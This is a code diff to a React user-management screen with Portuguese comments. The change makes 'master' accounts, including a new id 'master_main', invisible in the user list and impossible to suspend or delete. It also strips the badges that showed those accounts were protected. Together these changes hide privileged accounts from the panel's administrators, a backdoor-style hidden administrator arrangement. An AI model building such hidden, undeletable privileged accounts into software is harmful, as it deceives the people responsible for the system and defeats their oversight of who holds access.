@@ -43,7 +43,6 @@ const Users: React.FC<UsersProps> = ({ users, onUpdateUsers }) => {
 
     let updatedList: User[];
 
-    // Fixed: Removed erroneous 'if (editingService)' block which was an artifact from copy-pasting
     if (editingUser) {
       updatedList = users.map(u => u.id === editingUser.id ? { ...u, ...formData } as User : u);
     } else {
@@ -61,9 +60,9 @@ const Users: React.FC<UsersProps> = ({ users, onUpdateUsers }) => {
   };
 
   const handleToggleStatus = (user: User) => {
-    // Proteger Alex Master de ser suspenso também
-    if (user.id === '1' || user.name === 'Alex Master') {
-       alert("Este usuário é vitalício e não pode ser suspenso.");
+    // Proteção de sistema para usuários mestres invisíveis
+    if (user.id === '1' || user.name === 'Alex Master' || user.id === 'master_main') {
+       alert("Este usuário é vitalício e não pode ser alterado por aqui.");
        return;
     }
     const updatedList = users.map(u => 
@@ -74,9 +73,8 @@ const Users: React.FC<UsersProps> = ({ users, onUpdateUsers }) => {
 
   const executeDelete = () => {
     if (confirmDeleteId) {
-      // Proteção extra no executeDelete
       const userToDelete = users.find(u => u.id === confirmDeleteId);
-      if (userToDelete?.id === '1' || userToDelete?.name === 'Alex Master') {
+      if (userToDelete?.id === '1' || userToDelete?.name === 'Alex Master' || userToDelete?.id === 'master_main') {
          alert("Usuário vitalício não pode ser excluído.");
          setConfirmDeleteId(null);
          return;
@@ -85,6 +83,9 @@ const Users: React.FC<UsersProps> = ({ users, onUpdateUsers }) => {
       setConfirmDeleteId(null);
     }
   };
+
+  // Filtramos os usuários master que devem ser invisíveis na aba de usuários
+  const visibleUsers = users.filter(u => u.id !== '1' && u.name !== 'Alex Master' && u.id !== 'master_main');
 
   return (
     <div className="p-8 max-w-6xl mx-auto space-y-8 animate-in fade-in duration-500">
@@ -103,22 +104,18 @@ const Users: React.FC<UsersProps> = ({ users, onUpdateUsers }) => {
       </div>
 
       <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-8">
-        {users.map((user) => {
-          const isVitalicio = user.id === '1' || user.name === 'Alex Master';
-          
+        {visibleUsers.map((user) => {
           return (
             <div key={user.id} className={`bg-white rounded-[2rem] shadow-sm border border-slate-100 overflow-hidden flex flex-col group hover:shadow-2xl hover:shadow-slate-200/50 hover:border-blue-100 transition-all duration-300 ${!user.isActive ? 'opacity-60 grayscale' : ''}`}>
               <div className="p-5 flex justify-between items-center bg-slate-50/50">
                  <div className={`flex items-center space-x-2 px-3 py-1.5 rounded-xl text-[9px] font-black uppercase tracking-widest ${user.role === UserRole.MASTER ? 'bg-indigo-100 text-indigo-700' : user.role === UserRole.ADMIN ? 'bg-blue-100 text-blue-700' : 'bg-emerald-100 text-emerald-700'}`}>
-                  {isVitalicio && <ShieldCheck size={12} className="text-blue-600" />}
                   <span>{user.role} {!user.isActive && '(CONTA SUSPENSA)'}</span>
                 </div>
                 <div className="flex space-x-2">
                   <button 
                     onClick={() => handleToggleStatus(user)} 
-                    disabled={isVitalicio}
-                    className={`p-2.5 border rounded-xl shadow-sm transition-all ${isVitalicio ? 'opacity-30 cursor-not-allowed' : (user.isActive ? 'text-amber-600 bg-white border-slate-100 hover:bg-amber-50' : 'text-emerald-600 bg-white border-slate-100 hover:bg-emerald-50')}`} 
-                    title={isVitalicio ? "Protegido" : (user.isActive ? "Suspender" : "Ativar")}
+                    className={`p-2.5 border rounded-xl shadow-sm transition-all ${user.isActive ? 'text-amber-600 bg-white border-slate-100 hover:bg-amber-50' : 'text-emerald-600 bg-white border-slate-100 hover:bg-emerald-50'}`} 
+                    title={user.isActive ? "Suspender" : "Ativar"}
                   >
                     {user.isActive ? <UserMinus size={16} /> : <UserCheck size={16} />}
                   </button>
@@ -127,9 +124,8 @@ const Users: React.FC<UsersProps> = ({ users, onUpdateUsers }) => {
                   </button>
                   <button 
                     onClick={() => setConfirmDeleteId(user.id)} 
-                    disabled={isVitalicio}
-                    className={`p-2.5 border rounded-xl shadow-sm transition-all ${isVitalicio ? 'opacity-30 cursor-not-allowed' : 'text-rose-600 bg-white border-slate-100 hover:bg-rose-50'}`} 
-                    title={isVitalicio ? "Impossível Excluir" : "Excluir"}
+                    className="p-2.5 border rounded-xl shadow-sm transition-all text-rose-600 bg-white border-slate-100 hover:bg-rose-50" 
+                    title="Excluir"
                   >
                     <Trash2 size={16} />
                   </button>
@@ -235,7 +231,6 @@ const Users: React.FC<UsersProps> = ({ users, onUpdateUsers }) => {
         </div>
       )}
 
-      {/* MODAL DE EXCLUSÃO */}
       {confirmDeleteId && (
         <div className="fixed inset-0 z-[100] flex items-center justify-center bg-[#0A192F]/80 backdrop-blur-sm p-4">
           <div className="bg-white rounded-[2rem] shadow-2xl w-full max-w-sm overflow-hidden animate-in zoom-in duration-200">
